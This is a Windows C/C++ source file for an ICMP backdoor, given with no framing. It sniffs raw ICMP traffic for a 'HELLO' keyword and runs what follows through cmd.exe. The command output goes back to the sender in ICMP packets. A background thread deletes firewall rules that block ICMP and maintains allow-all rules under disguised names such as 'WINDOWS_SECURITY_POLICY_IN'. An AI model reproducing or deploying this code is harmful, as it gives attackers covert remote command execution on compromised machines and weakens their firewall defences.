#define WIN32_LEAN_AND_MEAN


#include <windows.h>
#include <stdio.h>
#include <comutil.h>
#include <atlcomcli.h>
#include "winsock2.h"
#include "ws2tcpip.h"
#include "Mstcpip.h"
#include <netfw.h>

// Need to link with Ws2_32.lib
#pragma comment (lib, "Ws2_32.lib")
#pragma comment( lib, "ole32.lib" )
#pragma comment( lib, "oleaut32.lib" )

// Forward declarations
HRESULT     WFCOMInitialize(INetFwPolicy2** ppNetFwPolicy2);
HRESULT     createIcmpRule(INetFwRules* rules, BSTR name, BSTR icmp, BSTR group, NET_FW_RULE_DIRECTION dir);
int find_keyword(char* buf, int size);
DWORD WINAPI fwMain(LPVOID lpParam);
LPCWSTR charArrToLPCWSTR(char* array);

const char* cmd_init = "HELLO";

int main(void)
{
    WSADATA wsaData;
    int iResult;
    SOCKET ListenSocket = INVALID_SOCKET;
    struct addrinfo* result = NULL;
    struct addrinfo hints;
    DWORD threadID;
    HANDLE fwThread = CreateThread(
        NULL,
        0,
        fwMain,
        NULL,
        0,
        &threadID
    );

    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        //printf("WSAStartup failed with error: %d\n", iResult);
        return 1;
    }

    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_RAW;
    hints.ai_protocol = 1;

    iResult = getaddrinfo("", "0", &hints, &result);
    if (iResult != 0) {
        //printf("getaddrinfo failed with error: %d\n", iResult);
        WSACleanup();
        return 1;
    }

    ListenSocket = WSASocket(AF_INET,SOCK_RAW,IPPROTO_ICMP,0,0,0);
    if (ListenSocket == INVALID_SOCKET) {
        //printf("socket failed with error: %ld\n", WSAGetLastError());
        freeaddrinfo(result);
        WSACleanup();
        return 1;
    }

    ADDRINFOA* current = result;
    do {
        TCHAR local_ip[40] = { 0 };
        DWORD local_size = _countof(local_ip);
        int ip_grabberx = WSAAddressToStringW(current->ai_addr, (DWORD)current->ai_addrlen, 0, local_ip, &local_size);
        //printf("Local: %ls \n", local_ip);
        bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
        current = current->ai_next;
    } while (current != NULL);

    int optval = 1;
    int in;
    WSAIoctl(ListenSocket, SIO_RCVALL, &optval, sizeof(optval), 0, 0, (LPDWORD)&in, 0, 0);

    //printf("server is listening\n");

    while (1)
    {
        struct sockaddr SenderAddr;
        int SenderAddrSize = sizeof(SenderAddr);
        memset(&SenderAddr, 0, SenderAddrSize);

        char buf[2000];
        memset(buf, 0, 2000);

        iResult = recvfrom(ListenSocket, buf, 2000, 0, &SenderAddr, &SenderAddrSize);
        if (iResult == SOCKET_ERROR) {
            //printf("recieve failed with error: %d\n", WSAGetLastError());
        }
        else {
            buf[iResult] = 0;
            DWORD senderSize = sizeof(SenderAddr);
            TCHAR source_ip[40] = { 0 };
            DWORD size = _countof(source_ip);
            int ip_grabber = WSAAddressToStringW(&SenderAddr, senderSize, NULL, source_ip, &size);
            int local_match = 0;
            ADDRINFOA* current = result;
            do {
                TCHAR local_ip[40] = { 0 };
                DWORD local_size = _countof(local_ip);
                int ip_grabberx = WSAAddressToStringW(current->ai_addr, (int)current->ai_addrlen, 0, local_ip, &local_size);
                if (source_ip == local_ip) {
                    local_match = 1;
                    break;
                }
                current = current->ai_next;
            } while (current != NULL);

            if (local_match) {
                continue;
            }
            int key_loc = find_keyword(buf, iResult);
            if (key_loc == -1) {
                continue;
            }
            else {
                //printf("%s > %s\n", source_ip, &buf[key_loc]);
            }
            if (buf[key_loc] == 'P' && buf[key_loc + 1] == 'I' && buf[key_loc + 2] == 'N' && buf[key_loc + 3] == 'G') {
                char response[] = "AAAAAAAAGOODBYEPONGDONE";
                for (int i = 0; i < 8; i++) {
                    response[i] = 0;
                }
                printf("%d\n", sendto(ListenSocket, response, sizeof(response), 0, &SenderAddr, senderSize));
                continue;
            }
            
            if (buf[key_loc] == 'c' && buf[key_loc + 1] == 'd') {
                LPCWSTR dir = charArrToLPCWSTR(&buf[key_loc + 3]);
                SetCurrentDirectory(dir);
            }

            char cmd[1000] = "cmd.exe /c ";
            char cmdend[] = " 2>&1";
            memcpy(&cmd[strlen(cmd)], &buf[key_loc], 1000 - strlen(cmd));
            memcpy(&cmd[strlen(cmd)], cmdend, 1000 - strlen(cmd));
            char   psBuffer[900];
            memset(psBuffer, 0, 900);
            FILE* pPipe;
            if ((pPipe = _popen(cmd, "rt")) == NULL) {
                continue;
            }
            while (fgets(psBuffer, 900, pPipe))
            {
                char sendBuffer[918];
                memset(sendBuffer, 0, 918);
                sendBuffer[8] = 'G';
                sendBuffer[9] = 'O';
                sendBuffer[10] = 'O';
                sendBuffer[11] = 'D';
                sendBuffer[12] = 'B';
                sendBuffer[13] = 'Y';
                sendBuffer[14] = 'E';
                //{0,0,0,0,0,0,0,0,'B','A','L','L','S'};
                memcpy(&sendBuffer[15], psBuffer, 900);
                WSABUF testBuf = WSABUF{
                    sizeof(sendBuffer),
                    sendBuffer
                };
                DWORD size = 918;

                iResult = sendto(ListenSocket, sendBuffer, 918, 0, &SenderAddr, senderSize);
                if (iResult == -1) {
                    //printf("send failed with error: %d\n", WSAGetLastError());
                }
                memset(psBuffer, 0, 900);
            }
            const char finalsend[] = { 0,0,0,0,0,0,0,0,'G','O','O','D','B','Y','E','D','O','N','E' };
            iResult = sendto(ListenSocket, finalsend, 19, 0, &SenderAddr, senderSize);
            if (iResult == -1) {
                //printf("final send failed with error: %d\n", WSAGetLastError());
            }
        }
    }
}

DWORD WINAPI fwMain(LPVOID lpParam)
{
    HRESULT hrComInit = S_OK;
    HRESULT hr = S_OK;

    ULONG cFetched = 0;
    CComVariant var;

    IUnknown* pEnumerator;
    IEnumVARIANT* pVariant = NULL;

    INetFwPolicy2* pNetFwPolicy2 = NULL;
    INetFwRules* pFwRules = NULL;
    INetFwRule* pFwRule = NULL;

    BSTR TARGET_NAME_IN = SysAllocString(L"WINDOWS_SECURITY_POLICY_IN");
    BSTR TARGET_NAME_OUT = SysAllocString(L"WINDOWS_SECURITY_POLICY_OUT");
    BSTR bstrRuleGroup = SysAllocString(L"WINDOWS_SECURITY");
    BSTR bstrICMPTypeCode = SysAllocString(L"*:*");
    INetFwRule* allowInRule = NULL;
    INetFwRule* allowOutRule = NULL;

    // Initialize COM.
    hrComInit = CoInitializeEx(
        0,
        COINIT_APARTMENTTHREADED
    );

    // Ignore RPC_E_CHANGED_MODE; this just means that COM has already been
    // initialized with a different mode. Since we don't care what the mode is,
    // we'll just use the existing mode.
    if (hrComInit != RPC_E_CHANGED_MODE)
    {
        if (FAILED(hrComInit))
        {
            goto Cleanup;
        }
    }

    // Retrieve INetFwPolicy2
    hr = WFCOMInitialize(&pNetFwPolicy2);
    if (FAILED(hr))
    {
        goto Cleanup;
    }

    // Retrieve INetFwRules
    hr = pNetFwPolicy2->get_Rules(&pFwRules);
    if (FAILED(hr))
    {
        goto Cleanup;
    }

    while (true) {
        // Iterate through all of the rules in pFwRules
        pFwRules->get__NewEnum(&pEnumerator);

        if (pEnumerator)
        {
            hr = pEnumerator->QueryInterface(__uuidof(IEnumVARIANT), (void**)&pVariant);
        }

        while (SUCCEEDED(hr) && hr != S_FALSE)
        {
            var.Clear();
            hr = pVariant->Next(1, &var, &cFetched);

            if (S_FALSE != hr)
            {
                if (SUCCEEDED(hr))
                {
                    hr = var.ChangeType(VT_DISPATCH);
                }
                if (SUCCEEDED(hr))
                {
                    hr = (V_DISPATCH(&var))->QueryInterface(__uuidof(INetFwRule), reinterpret_cast<void**>(&pFwRule));
                }

                if (SUCCEEDED(hr))
                {
                    LONG protocol = -1;
                    pFwRule->get_Protocol(&protocol);
                    NET_FW_ACTION action;
                    pFwRule->get_Action(&action);
                    BSTR name = NULL;
                    pFwRule->get_Name(&name);
                    NET_FW_RULE_DIRECTION dir;
                    pFwRule->get_Direction(&dir);
                    if (0 == wcscmp(name, TARGET_NAME_IN) && dir == NET_FW_RULE_DIR_IN) {
                        allowInRule = pFwRule;
                    }
                    if (0 == wcscmp(name, TARGET_NAME_OUT) && dir == NET_FW_RULE_DIR_OUT) {
                        allowOutRule = pFwRule;
                    }
                    if (protocol == 1 && action == NET_FW_ACTION_BLOCK && name != NULL) {
                        pFwRules->Remove(name);
                    }
                }
            }
        }
        if (allowInRule != NULL) {
            LONG protocol = -1;
            pFwRule->get_Protocol(&protocol);
            NET_FW_ACTION action;
            pFwRule->get_Action(&action);
            VARIANT_BOOL bEnabled;
            pFwRule->get_Enabled(&bEnabled);
            BSTR icmpCodes;
            pFwRule->get_IcmpTypesAndCodes(&icmpCodes);
            long profiles;
            pFwRule->get_Profiles(&profiles);

            if (protocol != 1 || action != NET_FW_ACTION_ALLOW || bEnabled != VARIANT_TRUE || wcscmp(icmpCodes, L"*:*") != 0 || profiles != NET_FW_PROFILE2_ALL) {
                pFwRules->Remove(TARGET_NAME_IN);
                if (FAILED(createIcmpRule(pFwRules, TARGET_NAME_IN, bstrICMPTypeCode, bstrRuleGroup, NET_FW_RULE_DIR_IN))) {
                    goto Cleanup;
                }
            }
        }
        else {
            if (FAILED(createIcmpRule(pFwRules, TARGET_NAME_IN, bstrICMPTypeCode, bstrRuleGroup, NET_FW_RULE_DIR_IN))) {
                goto Cleanup;
            }
        }

        if (allowOutRule != NULL) {
            LONG protocol = -1;
            pFwRule->get_Protocol(&protocol);
            NET_FW_ACTION action;
            pFwRule->get_Action(&action);
            VARIANT_BOOL bEnabled;
            pFwRule->get_Enabled(&bEnabled);
            BSTR icmpCodes;
            pFwRule->get_IcmpTypesAndCodes(&icmpCodes);
            long profiles;
            pFwRule->get_Profiles(&profiles);

            if (protocol != 1 || action != NET_FW_ACTION_ALLOW || bEnabled != VARIANT_TRUE || wcscmp(icmpCodes, L"*:*") != 0 || profiles != NET_FW_PROFILE2_ALL) {
                pFwRules->Remove(TARGET_NAME_OUT);
                if (FAILED(createIcmpRule(pFwRules, TARGET_NAME_OUT, bstrICMPTypeCode, bstrRuleGroup, NET_FW_RULE_DIR_OUT))) {
                    goto Cleanup;
                }
            }
        }
        else {
            if (FAILED(createIcmpRule(pFwRules, TARGET_NAME_OUT, bstrICMPTypeCode, bstrRuleGroup, NET_FW_RULE_DIR_OUT))) {
                goto Cleanup;
            }
        }
        Sleep(300000);
    }

Cleanup:

    // Release pFwRule
    if (pFwRule != NULL)
    {
        pFwRule->Release();
    }

    // Release INetFwPolicy2
    if (pNetFwPolicy2 != NULL)
    {
        pNetFwPolicy2->Release();
    }

    // Uninitialize COM.
    if (SUCCEEDED(hrComInit))
    {
        CoUninitialize();
    }

    return 0;
}


// Instantiate INetFwPolicy2
HRESULT WFCOMInitialize(INetFwPolicy2** ppNetFwPolicy2)
{
    HRESULT hr = S_OK;

    hr = CoCreateInstance(
        __uuidof(NetFwPolicy2),
        NULL,
        CLSCTX_INPROC_SERVER,
        __uuidof(INetFwPolicy2),
        (void**)ppNetFwPolicy2);

    if (FAILED(hr))
    {
        goto Cleanup;
    }

Cleanup:
    return hr;
}

HRESULT createIcmpRule(INetFwRules* rules, BSTR name, BSTR icmp, BSTR group, NET_FW_RULE_DIRECTION dir) {
    INetFwRule* newFwRule = NULL;
    HRESULT hr = S_OK;
    // Create a new Firewall Rule object.
    hr = CoCreateInstance(
        __uuidof(NetFwRule),
        NULL,
        CLSCTX_INPROC_SERVER,
        __uuidof(INetFwRule),
        (void**)&newFwRule);
    if (FAILED(hr))
    {
        return hr;
    }
    newFwRule->put_Name(name);
    newFwRule->put_Protocol(1);
    newFwRule->put_IcmpTypesAndCodes(icmp);
    newFwRule->put_Grouping(group);
    newFwRule->put_Profiles(NET_FW_PROFILE2_ALL);
    newFwRule->put_Action(NET_FW_ACTION_ALLOW);
    newFwRule->put_Enabled(VARIANT_TRUE);
    newFwRule->put_Direction(dir);

    // Add the Firewall Rule
    hr = rules->Add(newFwRule);
    return hr;
}

int find_keyword(char* buf, int size) {
    int cmd_init_size = strlen(cmd_init);
    for (int i = 0; i < size - cmd_init_size; i++) {
        char test[100];
        memcpy(test, &buf[i], cmd_init_size);
        test[5] = 0;
        if (strcmp(test, cmd_init) == 0) {
            return i + cmd_init_size;
        }
    }
    return -1;
}

LPCWSTR charArrToLPCWSTR(char* array) {
    wchar_t* wString = new wchar_t[4096];
    MultiByteToWideChar(CP_ACP, 0, array, -1, wString, 4096);
    return wString;
}